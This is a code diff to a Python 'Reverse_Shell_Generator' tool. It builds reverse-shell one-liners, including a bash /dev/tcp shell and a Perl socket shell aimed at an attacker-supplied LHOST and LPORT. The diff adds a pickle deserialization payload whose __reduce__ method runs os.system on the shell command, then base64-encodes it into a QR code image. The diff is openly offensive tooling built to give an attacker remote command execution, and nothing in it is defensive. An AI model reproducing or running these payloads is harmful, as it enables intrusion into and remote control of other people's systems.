@@ -65,9 +65,14 @@ class Reverse_Shell_Generator:
                 self.QR_code(data=self.result)
             
             elif "bash" in self.args.type:
+                if not self.args.QR:
                     self.result=  "bash -i >& /dev/tcp/"+f'{self.args.LHOST}'+"/"+f'{self.args.LPORT}'+" 0>&1" 
-                    self.Base64() 
-                    self.QR_code(data=self.result)
+                elif self.args.QR:
+                    self.result=  f'bash -c "bash -i >& /dev/tcp/{self.args.LHOST}/{self.args.LPORT} 0>&1"'
+                self.Base64() 
+                self.QR_code(data=self.result)
+                
+                       
             elif "perl" in self.args.type:
                  self.result = "perl -e 'use Socket;$i="+f'{self.args.LHOST}'\
                         +";$p="+f'{self.args.LPORT}'+";socket(S,PF_INET,SOCK_STREAM,getprotobyname("\
@@ -349,32 +354,41 @@ class Reverse_Shell_Generator:
             else :
                 print("\n"+"="*40+"\n\n"+"Upgrading a basic shell to a fully interactive TTY shell  \n\n"+Fprint[50:])
                 exit()
-        def QR_code(self,data):
-          if self.args.QR:
-              if self.args.pickle  :
-                   payload = base64.b64encode(
-                                pickle.dumps(self.result)
-                            ).decode()
-              else:
-                 payload  = data
-              qr = qrcode.QRCode(
+
+        def QR_code(self, data):
+            if self.args.QR:
+
+                payload_code = f"__import__('os').system('{data}')" 
+                
+                class RCE:
+                    def __reduce__(self):
+                        return (os.system, (data,))
+            
+                payload = base64.b64encode(
+                    pickle.dumps(RCE())
+                ).decode()
+            
+            else:
+                payload = data
+
+            qr = qrcode.QRCode(
                         version=None,
                         error_correction=qrcode.constants.ERROR_CORRECT_L,
                         box_size=10,
                         border=4
                     )
-              qr.add_data(payload)
-              qr.make(fit=True)
-              qr.print_ascii()
-              img = qr.make_image(fill_color="black" , back_color="white").convert("RGB")
-              img = img.resize((600, 600))
-              path1 = "./Store_shell/"
-              filename = os.path.join(path1, f"{self.args.type}_QR.png")
-              img.save(filename)
-              print('\n'+'='*30 +'\n') 
-              print('[*] Generated  : Done !!')
-              print(f'[*] File Name  : {self.args.type}_QR.png')
-              print(f'[+] File Path  : {path}/{self.args.type}_QR.png')   
+            qr.add_data(payload)
+            qr.make(fit=True)
+            qr.print_ascii()
+            img = qr.make_image(fill_color="black" , back_color="white").convert("RGB")
+            img = img.resize((600, 600))
+            path1 = "./Store_shell/"
+            filename = os.path.join(path1, f"{self.args.type}_QR.png")
+            img.save(filename)
+            print('\n'+'='*30 +'\n') 
+            print('[*] Generated  : Done !!')
+            print(f'[*] File Name  : {self.args.type}_QR.png')
+            print(f'[+] File Path  : {path}/{self.args.type}_QR.png')   
 
 if __name__=='__main__':
     Reverse_Shell_Generator()  
